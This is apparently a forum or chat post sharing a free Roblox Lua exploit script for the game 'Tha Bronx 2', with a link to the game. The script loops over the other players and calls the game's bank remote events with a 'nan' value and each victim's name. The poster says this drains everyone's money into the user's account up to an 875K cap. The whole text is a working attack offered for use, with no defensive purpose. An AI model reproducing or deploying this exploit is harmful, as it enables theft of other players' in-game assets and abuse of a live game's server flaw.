```	local Players = game:GetService("Players")
	for i, plr in pairs(Players:GetChildren()) do
	if plr ~= game:GetService("Players").LocalPlayer then
    wait(1)
    game:GetService("ReplicatedStorage"):WaitForChild("BankProcessRemote"):InvokeServer("Send","nan",plr.Name)
	game:GetService("ReplicatedStorage"):WaitForChild("BankAction"):FireServer("depo","30000")
	print(game:GetService("Players").LocalPlayer.stored.Bank.Value)
    end
    end```
Heres a free script it removes everyone money in the game and also gives you their money to reach max money which is 875K
heres the game link: https://www.roblox.com/games/9874911474/BIG-UPDATE-Tha-Bronx-2#!/game-instances